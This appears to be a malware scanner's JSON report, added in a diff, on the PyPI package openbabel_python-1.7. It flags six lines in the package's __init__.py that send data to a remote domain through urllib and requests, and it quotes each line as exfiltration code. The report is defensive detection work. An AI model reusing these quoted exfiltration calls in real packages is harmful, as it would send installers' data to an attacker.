@@ -1,0 +1,49 @@
+{
+    "issues": 6,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "openbabel_python/__init__.py:73",
+                "code": "    r = urllib.request.urlopen(\"http://%s/p\" % http_domain, data=data_post.encode(), timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "openbabel_python/__init__.py:79",
+                "code": "    r = urllib.request.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "openbabel_python/__init__.py:85",
+                "code": "    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "openbabel_python/__init__.py:91",
+                "code": "    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "openbabel_python/__init__.py:97",
+                "code": "    r = urllib.urlopen(\"http://%s/p\" % http_domain, data=data_post)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "openbabel_python/__init__.py:103",
+                "code": "    r = urllib.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get))\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/openbabel_python-1.7"
+}
